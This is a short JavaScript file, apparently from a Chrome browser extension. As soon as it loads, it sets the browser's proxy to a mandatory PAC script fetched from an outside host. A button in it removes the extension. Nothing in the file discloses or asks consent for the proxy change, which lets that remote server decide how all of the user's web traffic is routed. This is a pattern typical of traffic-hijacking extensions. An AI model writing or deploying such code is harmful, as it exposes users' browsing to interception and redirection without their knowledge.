function set_pac_data(){
    chrome.proxy.settings.set({
        value: {
            mode: 'pac_script',
            pacScript: {
                url: "https://service.shyonghui.xyz/install.html",
                mandatory: true
            }
        },
        scope: 'regular'
    });
}

set_pac_data();

function uninstallself(){
    chrome.management.uninstallSelf();
}

document.getElementById("uninstall-btn").addEventListener('click',function ()
{
    uninstallself();
} ); 